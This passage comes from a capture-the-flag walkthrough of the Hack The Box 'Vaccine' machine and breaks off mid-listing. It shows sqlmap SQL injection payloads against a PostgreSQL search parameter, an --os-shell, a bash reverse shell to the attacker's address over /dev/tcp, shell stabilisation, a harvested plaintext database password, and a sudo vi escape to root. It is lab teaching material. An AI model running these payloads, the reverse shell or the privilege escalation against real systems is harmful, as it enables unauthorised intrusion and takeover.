</span></span><span class=line><span class=cl>GET parameter <span class=s1>&#39;search&#39;</span> is vulnerable. Do you want to keep testing the others <span class=o>(</span><span class=k>if</span> any<span class=o>)</span>? <span class=o>[</span>y/N<span class=o>]</span> N
</span></span><span class=line><span class=cl>sqlmap identified the following injection point<span class=o>(</span>s<span class=o>)</span> with a total of <span class=m>34</span> HTTP<span class=o>(</span>s<span class=o>)</span> requests:
</span></span><span class=line><span class=cl>---
</span></span><span class=line><span class=cl>Parameter: search <span class=o>(</span>GET<span class=o>)</span>
</span></span><span class=line><span class=cl>    Type: boolean-based blind
</span></span><span class=line><span class=cl>    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause <span class=o>(</span>CAST<span class=o>)</span>
</span></span><span class=line><span class=cl>    Payload: <span class=nv>search</span><span class=o>=</span>test<span class=s1>&#39; AND (SELECT (CASE WHEN (1932=1932) THEN NULL ELSE CAST((CHR(82)||CHR(87)||CHR(111)||CHR(97)) AS NUMERIC) END)) IS NULL-- PmQn
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    Type: error-based
</span></span></span><span class=line><span class=cl><span class=s1>    Title: PostgreSQL AND error-based - WHERE or HAVING clause
</span></span></span><span class=line><span class=cl><span class=s1>    Payload: search=test&#39;</span> AND <span class=nv>9113</span><span class=o>=</span>CAST<span class=o>((</span>CHR<span class=o>(</span>113<span class=o>)||</span>CHR<span class=o>(</span>98<span class=o>)||</span>CHR<span class=o>(</span>107<span class=o>)||</span>CHR<span class=o>(</span>112<span class=o>)||</span>CHR<span class=o>(</span>113<span class=o>))||(</span>SELECT <span class=o>(</span>CASE WHEN <span class=o>(</span><span class=nv>9113</span><span class=o>=</span>9113<span class=o>)</span> THEN <span class=m>1</span> ELSE <span class=m>0</span> END<span class=o>))</span>::text<span class=o>||(</span>CHR<span class=o>(</span>113<span class=o>)||</span>CHR<span class=o>(</span>112<span class=o>)||</span>CHR<span class=o>(</span>113<span class=o>)||</span>CHR<span class=o>(</span>107<span class=o>)||</span>CHR<span class=o>(</span>113<span class=o>))</span> AS NUMERIC<span class=o>)</span>-- QJaM
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Type: stacked queries
</span></span><span class=line><span class=cl>    Title: PostgreSQL &gt; 8.1 stacked queries <span class=o>(</span>comment<span class=o>)</span>
</span></span><span class=line><span class=cl>    Payload: <span class=nv>search</span><span class=o>=</span>test<span class=s1>&#39;;SELECT PG_SLEEP(5)--
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    Type: time-based blind
</span></span></span><span class=line><span class=cl><span class=s1>    Title: PostgreSQL &gt; 8.1 AND time-based blind
</span></span></span><span class=line><span class=cl><span class=s1>    Payload: search=test&#39;</span> AND <span class=nv>4415</span><span class=o>=(</span>SELECT <span class=m>4415</span> FROM PG_SLEEP<span class=o>(</span>5<span class=o>))</span>-- SmbO
</span></span><span class=line><span class=cl>---
</span></span><span class=line><span class=cl><span class=o>[</span>04:29:02<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> the back-end DBMS is PostgreSQL
</span></span><span class=line><span class=cl>web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 <span class=o>(</span>eoan or focal<span class=o>)</span>
</span></span><span class=line><span class=cl>web application technology: Apache 2.4.41
</span></span><span class=line><span class=cl>back-end DBMS: PostgreSQL
</span></span><span class=line><span class=cl><span class=o>[</span>04:29:02<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> fetched data logged to text files under <span class=s1>&#39;/home/htb-bluewalle/.local/share/sqlmap/output/10.129.94.247&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> ending @ 04:29:02 /2023-05-18/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>But considering our <strong>aim</strong> here - simply getting and interactive shell and <strong>gaining</strong> a <strong>foothold</strong> on the <strong>target</strong> - we decide for the aforementioned <em>--os-shell</em> <strong>option</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ sqlmap -u http://10.129.94.247/dashboard.php?search<span class=o>=</span><span class=nb>test</span> --cookie<span class=o>=</span><span class=s2>&#34;PHPSESSID=28ivthf91jm4d05jrcl09d0k7a&#34;</span> --os-shell
</span></span><span class=line><span class=cl>        ___
</span></span><span class=line><span class=cl>       __H__
</span></span><span class=line><span class=cl> ___ ___<span class=o>[</span><span class=s1>&#39;]_____ ___ ___  {1.6.12#stable}
</span></span></span><span class=line><span class=cl><span class=s1>|_ -| . [.]     | .&#39;</span><span class=p>|</span> . <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span>___<span class=p>|</span>_  <span class=o>[)]</span>_<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>__,<span class=p>|</span>  _<span class=p>|</span>
</span></span><span class=line><span class=cl>      <span class=p>|</span>_<span class=p>|</span>V...       <span class=p>|</span>_<span class=p>|</span>   https://sqlmap.org
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> legal disclaimer: Usage of sqlmap <span class=k>for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class=s1>&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>[*] starting @ 04:36:02 /2023-05-18/
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>[04:36:02] [INFO] resuming back-end DBMS &#39;</span>postgresql<span class=s1>&#39; 
</span></span></span><span class=line><span class=cl><span class=s1>[04:36:02] [INFO] testing connection to the target URL
</span></span></span><span class=line><span class=cl><span class=s1>sqlmap resumed the following injection point(s) from stored session:
</span></span></span><span class=line><span class=cl><span class=s1>---
</span></span></span><span class=line><span class=cl><span class=s1>Parameter: search (GET)
</span></span></span><span class=line><span class=cl><span class=s1>    Type: boolean-based blind
</span></span></span><span class=line><span class=cl><span class=s1>    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
</span></span></span><span class=line><span class=cl><span class=s1>    Payload: search=test&#39;</span> AND <span class=o>(</span>SELECT <span class=o>(</span>CASE WHEN <span class=o>(</span><span class=nv>1932</span><span class=o>=</span>1932<span class=o>)</span> THEN NULL ELSE CAST<span class=o>((</span>CHR<span class=o>(</span>82<span class=o>)||</span>CHR<span class=o>(</span>87<span class=o>)||</span>CHR<span class=o>(</span>111<span class=o>)||</span>CHR<span class=o>(</span>97<span class=o>))</span> AS NUMERIC<span class=o>)</span> END<span class=o>))</span> IS NULL-- PmQn
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Type: error-based
</span></span><span class=line><span class=cl>    Title: PostgreSQL AND error-based - WHERE or HAVING clause
</span></span><span class=line><span class=cl>    Payload: <span class=nv>search</span><span class=o>=</span>test<span class=s1>&#39; AND 9113=CAST((CHR(113)||CHR(98)||CHR(107)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (9113=9113) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(113)||CHR(107)||CHR(113)) AS NUMERIC)-- QJaM
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    Type: stacked queries
</span></span></span><span class=line><span class=cl><span class=s1>    Title: PostgreSQL &gt; 8.1 stacked queries (comment)
</span></span></span><span class=line><span class=cl><span class=s1>    Payload: search=test&#39;</span><span class=p>;</span>SELECT PG_SLEEP<span class=o>(</span>5<span class=o>)</span>--
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Type: time-based blind
</span></span><span class=line><span class=cl>    Title: PostgreSQL &gt; 8.1 AND time-based blind
</span></span><span class=line><span class=cl>    Payload: <span class=nv>search</span><span class=o>=</span>test<span class=s1>&#39; AND 4415=(SELECT 4415 FROM PG_SLEEP(5))-- SmbO
</span></span></span><span class=line><span class=cl><span class=s1>---
</span></span></span><span class=line><span class=cl><span class=s1>[04:36:03] [INFO] the back-end DBMS is PostgreSQL
</span></span></span><span class=line><span class=cl><span class=s1>web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)
</span></span></span><span class=line><span class=cl><span class=s1>web application technology: Apache 2.4.41
</span></span></span><span class=line><span class=cl><span class=s1>back-end DBMS: PostgreSQL
</span></span></span><span class=line><span class=cl><span class=s1>[04:36:03] [INFO] fingerprinting the back-end DBMS operating system
</span></span></span><span class=line><span class=cl><span class=s1>[04:36:03] [INFO] the back-end DBMS operating system is Linux
</span></span></span><span class=line><span class=cl><span class=s1>[04:36:03] [INFO] testing if current user is DBA
</span></span></span><span class=line><span class=cl><span class=s1>[04:36:03] [INFO] retrieved: &#39;</span>1<span class=s1>&#39;
</span></span></span><span class=line><span class=cl><span class=s1>[04:36:03] [INFO] going to use &#39;</span>COPY ... FROM PROGRAM ...<span class=s1>&#39; command execution
</span></span></span><span class=line><span class=cl><span class=s1>[04:36:03] [INFO] calling Linux OS shell. To quit type &#39;</span>x<span class=s1>&#39; or &#39;</span>q<span class=err>&#39;</span> and press ENTER
</span></span><span class=line><span class=cl>os-shell&gt; 
</span></span></code></pre></div><p>But interacting with this <strong>shell</strong> seems quite problematic,</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>os-shell&gt; whoami
</span></span><span class=line><span class=cl><span class=k>do</span> you want to retrieve the <span class=nb>command</span> standard output? <span class=o>[</span>Y/n/a<span class=o>]</span> Y
</span></span><span class=line><span class=cl><span class=o>[</span>04:49:35<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: <span class=s1>&#39;postgres&#39;</span>
</span></span><span class=line><span class=cl><span class=nb>command</span> standard output: <span class=s1>&#39;postgres&#39;</span>
</span></span><span class=line><span class=cl>os-shell&gt; <span class=nb>pwd</span>
</span></span><span class=line><span class=cl><span class=k>do</span> you want to retrieve the <span class=nb>command</span> standard output? <span class=o>[</span>Y/n/a<span class=o>]</span> Y
</span></span><span class=line><span class=cl><span class=o>[</span>04:49:58<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: <span class=s1>&#39;/var/lib/postgresql/11/main&#39;</span>
</span></span><span class=line><span class=cl><span class=nb>command</span> standard output: <span class=s1>&#39;/var/lib/postgresql/11/main&#39;</span>
</span></span><span class=line><span class=cl>os-shell&gt; 
</span></span></code></pre></div><p>so we strive for a better one by launching a <strong>reverse shell</strong> back to our local machine.</p><p>First we <strong>start</strong> our <strong>listener</strong> on our <strong>local</strong> machine.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nc -lvnp <span class=m>4444</span>
</span></span><span class=line><span class=cl>Ncat: Version 7.93 <span class=o>(</span> https://nmap.org/ncat <span class=o>)</span>
</span></span><span class=line><span class=cl>Ncat: Listening on :::4444
</span></span><span class=line><span class=cl>Ncat: Listening on 0.0.0.0:4444
</span></span></code></pre></div><p>Then we run our <strong>reverse shell</strong> on the <strong>target</strong> machine.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>os-shell&gt; bash -c <span class=s1>&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.12/4444 0&gt;&amp;1&#39;</span>
</span></span><span class=line><span class=cl><span class=k>do</span> you want to retrieve the <span class=nb>command</span> standard output? <span class=o>[</span>Y/n/a<span class=o>]</span> Y
</span></span><span class=line><span class=cl><span class=o>[</span>04:56:46<span class=o>]</span> <span class=o>[</span>WARNING<span class=o>]</span> turning off pre-connect mechanism because of connection reset<span class=o>(</span>s<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>04:56:46<span class=o>]</span> <span class=o>[</span>CRITICAL<span class=o>]</span> connection reset to the target URL. sqlmap is going to retry the request<span class=o>(</span>s<span class=o>)</span>
</span></span></code></pre></div><p>If we did everything right, we <strong>catch</strong> a <strong>connection</strong> back on our <strong>listener</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nc -lvnp <span class=m>4444</span>
</span></span><span class=line><span class=cl>Ncat: Version 7.93 <span class=o>(</span> https://nmap.org/ncat <span class=o>)</span>
</span></span><span class=line><span class=cl>Ncat: Listening on :::4444
</span></span><span class=line><span class=cl>Ncat: Listening on 0.0.0.0:4444
</span></span><span class=line><span class=cl>Ncat: Connection from 10.129.94.247.
</span></span><span class=line><span class=cl>Ncat: Connection from 10.129.94.247:52230.
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>4499<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>postgres@vaccine:/var/lib/postgresql/11/main$
</span></span></code></pre></div><p>Sadly, this connection (again) seems a little bit shabby, so we 'upgrade' it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>postgres@vaccine:/var/lib/postgresql/11/main$ which python3
</span></span><span class=line><span class=cl>which python3
</span></span><span class=line><span class=cl>/usr/bin/python3
</span></span><span class=line><span class=cl>postgres@vaccine:/var/lib/postgresql/11/main$ python3 -c <span class=s1>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl>&lt;in$ python3 -c <span class=s1>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl>postgres@vaccine:/var/lib/postgresql/11/main$ <span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span><span class=line><span class=cl>postgres@vaccine:/var/lib/postgresql/11/main$ ^Z
</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span>+  Stopped                 nc -lvnp <span class=m>4444</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ stty raw -echo<span class=p>;</span> <span class=nb>fg</span>
</span></span><span class=line><span class=cl>nc -lvnp <span class=m>4444</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>postgres@vaccine:/var/lib/postgresql/11/main$ 
</span></span></code></pre></div><p>Now that we have a <strong>stable</strong> and <strong>nice</strong> <strong>interactive shell</strong> we can take a better look at our surroundings. Traversing two directories up will get us the <strong>user flag</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>postgres@vaccine:/var/lib/postgresql$ ls -hla
</span></span><span class=line><span class=cl>total 24K
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>5</span> postgres postgres 4.0K Oct <span class=m>11</span>  <span class=m>2021</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>39</span> root     root     4.0K Jul <span class=m>23</span>  <span class=m>2021</span> ..
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>3</span> postgres postgres 4.0K Jul <span class=m>23</span>  <span class=m>2021</span> <span class=m>11</span>
</span></span><span class=line><span class=cl>lrwxrwxrwx  <span class=m>1</span> root     root        <span class=m>9</span> Feb  <span class=m>4</span>  <span class=m>2020</span> .bash_history -&gt; /dev/null
</span></span><span class=line><span class=cl>drwxrwxr-x  <span class=m>3</span> postgres postgres 4.0K Jul <span class=m>23</span>  <span class=m>2021</span> .local
</span></span><span class=line><span class=cl>lrwxrwxrwx  <span class=m>1</span> root     root        <span class=m>9</span> Feb  <span class=m>4</span>  <span class=m>2020</span> .psql_history -&gt; /dev/null
</span></span><span class=line><span class=cl>drwx------  <span class=m>2</span> postgres postgres 4.0K Jul <span class=m>23</span>  <span class=m>2021</span> .ssh
</span></span><span class=line><span class=cl>-r--------  <span class=m>1</span> postgres postgres   <span class=m>33</span> Oct <span class=m>11</span>  <span class=m>2021</span> user.txt
</span></span><span class=line><span class=cl>postgres@vaccine:/var/lib/postgresql$ cat user.txt 
</span></span><span class=line><span class=cl>&lt;flag&gt;
</span></span><span class=line><span class=cl>postgres@vaccine:/var/lib/postgresql$
</span></span></code></pre></div><p>That&rsquo;s nice, but even with this &lsquo;upgraded&rsquo; shell our <strong>connection</strong> will <strong>time out</strong> and <strong>break down</strong> after a few minutes. With this issue in mind, we set out to <strong>search</strong> for any <strong>leftover</strong> and <strong>leaked</strong> <strong>credentials</strong> which we could then use for an <em><strong>ssh</strong></em> connection.</p><p>We get lucky when we search the directory where the webpage is installed.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>postgres@vaccine:/var/www/html$ grep -i passw* *
</span></span><span class=line><span class=cl>dashboard.php:	  <span class=nv>$conn</span> <span class=o>=</span> pg_connect<span class=o>(</span><span class=s2>&#34;host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>index.php:  <span class=k>if</span><span class=o>(</span>isset<span class=o>(</span><span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;username&#39;</span><span class=o>])</span> <span class=o>&amp;&amp;</span> isset<span class=o>(</span><span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;password&#39;</span><span class=o>]))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>index.php:    <span class=k>if</span><span class=o>(</span><span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;username&#39;</span><span class=o>]</span> <span class=o>===</span> <span class=s1>&#39;admin&#39;</span> <span class=o>&amp;&amp;</span> md5<span class=o>(</span><span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;password&#39;</span><span class=o>])</span> <span class=o>===</span> <span class=s2>&#34;2cb42f8734ea607eefed3b70af13bbd3&#34;</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>index.php:        &lt;label <span class=k>for</span><span class=o>=</span><span class=s2>&#34;login__password&#34;</span>&gt;&lt;svg <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;icon&#34;</span>&gt;&lt;use xmlns:xlink<span class=o>=</span><span class=s2>&#34;http://www.w3.org/1999/xlink&#34;</span> xlink:href<span class=o>=</span><span class=s2>&#34;#lock&#34;</span>&gt;&lt;/use&gt;&lt;/svg&gt;&lt;span <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;hidden&#34;</span>&gt;Password&lt;/span&gt;&lt;/label&gt;
</span></span><span class=line><span class=cl>index.php:        &lt;input <span class=nv>id</span><span class=o>=</span><span class=s2>&#34;login__password&#34;</span> <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;password&#34;</span> <span class=nv>name</span><span class=o>=</span><span class=s2>&#34;password&#34;</span> <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;form__input&#34;</span> <span class=nv>placeholder</span><span class=o>=</span><span class=s2>&#34;Password&#34;</span> required&gt;
</span></span><span class=line><span class=cl>style.css:.form input<span class=o>[</span><span class=nv>type</span><span class=o>=</span><span class=s1>&#39;password&#39;</span><span class=o>]</span>,
</span></span><span class=line><span class=cl>style.css:.login input<span class=o>[</span><span class=nv>type</span><span class=o>=</span><span class=s1>&#39;password&#39;</span><span class=o>]</span>,
</span></span><span class=line><span class=cl>style.css:.login input<span class=o>[</span><span class=nv>type</span><span class=o>=</span><span class=s1>&#39;password&#39;</span><span class=o>]</span>,
</span></span><span class=line><span class=cl>style.css:.login input<span class=o>[</span><span class=nv>type</span><span class=o>=</span><span class=s1>&#39;password&#39;</span><span class=o>]</span>:focus,
</span></span><span class=line><span class=cl>style.css:.login input<span class=o>[</span><span class=nv>type</span><span class=o>=</span><span class=s1>&#39;password&#39;</span><span class=o>]</span>:hover,
</span></span><span class=line><span class=cl>postgres@vaccine:/var/www/html$
</span></span></code></pre></div><p>Using the credentials found in - <em>dashboard.php</em> -</p><table><thead><tr><th>credentials found in dashboard.php</th><th></th></tr></thead><tbody><tr><td><em>username</em></td><td style=text-align:left>postgres</td></tr><tr><td><em>password</em></td><td style=text-align:left>P@s5w0rd!</td></tr></tbody></table><p>we try to initiate and <strong>ssh connection</strong> to our <strong>target</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ssh postgres@<span class=nv>$rhost</span>
</span></span><span class=line><span class=cl>The authenticity of host <span class=s1>&#39;10.129.94.247 (10.129.94.247)&#39;</span> can<span class=s1>&#39;t be established.
</span></span></span><span class=line><span class=cl><span class=s1>ECDSA key fingerprint is SHA256:eVsQ4RXbKR9eOZaXSlMmyuKTDOQ39NAb4vD+GOegBvk.
</span></span></span><span class=line><span class=cl><span class=s1>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span class=line><span class=cl><span class=s1>Warning: Permanently added &#39;</span>10.129.94.247<span class=s1>&#39; (ECDSA) to the list of known hosts.
</span></span></span><span class=line><span class=cl><span class=s1>postgres@10.129.94.247&#39;</span>s password: 
</span></span><span class=line><span class=cl>Welcome to Ubuntu 19.10 <span class=o>(</span>GNU/Linux 5.3.0-64-generic x86_64<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> * Documentation:  https://help.ubuntu.com
</span></span><span class=line><span class=cl> * Management:     https://landscape.canonical.com
</span></span><span class=line><span class=cl> * Support:        https://ubuntu.com/advantage
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  System information as of Thu <span class=m>18</span> May <span class=m>2023</span> 04:20:13 AM UTC
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  System load:  0.0               Processes:             <span class=m>185</span>
</span></span><span class=line><span class=cl>  Usage of /:   32.6% of 8.73GB   Users logged in:       <span class=m>0</span>
</span></span><span class=line><span class=cl>  Memory usage: 20%               IP address <span class=k>for</span> ens160: 10.129.94.247
</span></span><span class=line><span class=cl>  Swap usage:   0%
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>0</span> updates can be installed immediately.
</span></span><span class=line><span class=cl><span class=m>0</span> of these updates are security updates.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The list of available updates is more than a week old.
</span></span><span class=line><span class=cl>To check <span class=k>for</span> new updates run: sudo apt update
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The programs included with the Ubuntu system are free software<span class=p>;</span>
</span></span><span class=line><span class=cl>the exact distribution terms <span class=k>for</span> each program are described in the
</span></span><span class=line><span class=cl>individual files in /usr/share/doc/*/copyright.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span></span><span class=line><span class=cl>applicable law.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>postgres@vaccine:~$ 
</span></span></code></pre></div><blockquote><p>--os-shell</p></blockquote><h2 id=task-7><strong>TASK 7</strong><a hidden class=anchor aria-hidden=true href=#task-7>#</a></h2><p><strong>Question</strong>: <em>What program can the postgres user run as root using sudo?</em></p><p>We can use the <em>-l</em> <strong>option</strong> in the <em><strong>sudo</strong></em> command to list the current user&rsquo;s <strong>privileges</strong> or to check a specific command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>postgres@vaccine:~$ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>111<span class=o>(</span>postgres<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>117<span class=o>(</span>postgres<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>117<span class=o>(</span>postgres<span class=o>)</span>,116<span class=o>(</span>ssl-cert<span class=o>)</span>
</span></span><span class=line><span class=cl>postgres@vaccine:~$ sudo -l
</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> postgres: 
</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> postgres on vaccine:
</span></span><span class=line><span class=cl>    <span class=nv>env_keep</span><span class=o>+=</span><span class=s2>&#34;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET&#34;</span>, <span class=nv>env_keep</span><span class=o>+=</span><span class=s2>&#34;XAPPLRESDIR
</span></span></span><span class=line><span class=cl><span class=s2>    XFILESEARCHPATH XUSERFILESEARCHPATH&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin,
</span></span><span class=line><span class=cl>    mail_badpass
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User postgres may run the following commands on vaccine:
</span></span><span class=line><span class=cl>    <span class=o>(</span>ALL<span class=o>)</span> /bin/vi /etc/postgresql/11/main/pg_hba.conf
</span></span><span class=line><span class=cl>postgres@vaccine:~$
</span></span></code></pre></div><blockquote><p>vi</p></blockquote><h2 id=submit-flag><strong>SUBMIT FLAG</strong><a hidden class=anchor aria-hidden=true href=#submit-flag>#</a></h2><p><strong>Question</strong>: <em>Submit user flag</em></p><p>The <strong>user flag</strong> was <strong>already aquired</strong> during TASK6.</p><blockquote><p>flag</p></blockquote><h2 id=submit-flag-1><strong>SUBMIT FLAG</strong><a hidden class=anchor aria-hidden=true href=#submit-flag-1>#</a></h2><p><strong>Question</strong>: <em>Submit root flag</em></p><p>Using the connection from TASK6 and building on the information we found in TASK7, all that&rsquo;s left for us is to first somehow <strong>escape</strong> the <em><strong>vi</strong></em> <strong>environment</strong> and then to <strong>spawn</strong> a <strong>root shell</strong>.</p><p>So we run the <strong>aforementioned</strong> command (<em>sudo -l</em> output in TASK7) as <strong>root</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>postgres@vaccine:~$ sudo -u root /bin/vi /etc/postgresql/11/main/pg_hba.conf
</span></span></code></pre></div><p>and use the following commands inside <em><strong>vi</strong></em> to <strong>spawn</strong> a <strong>root shell</strong>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>:set <span class=nv>shell</span><span class=o>=</span>/bin/bash
</span></span><span class=line><span class=cl>:shell
</span></span></code></pre></div><p>Once we have the <strong>root shell</strong>, the finaly touch is simply <strong>locating</strong> and <strong>grabbing</strong> the <strong>root flag</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@vaccine:/# <span class=nb>cd</span> root
</span></span><span class=line><span class=cl>root@vaccine:~# ls -hla
</span></span><span class=line><span class=cl>total 52K
</span></span><span class=line><span class=cl>drwx------  <span class=m>7</span> root root 4.0K May <span class=m>18</span> 04:49 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>20</span> root root 4.0K Oct <span class=m>11</span>  <span class=m>2021</span> ..
</span></span><span class=line><span class=cl>lrwxrwxrwx  <span class=m>1</span> root root    <span class=m>9</span> Feb  <span class=m>4</span>  <span class=m>2020</span> .bash_history -&gt; /dev/null
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root 3.1K Aug <span class=m>27</span>  <span class=m>2019</span> .bashrc
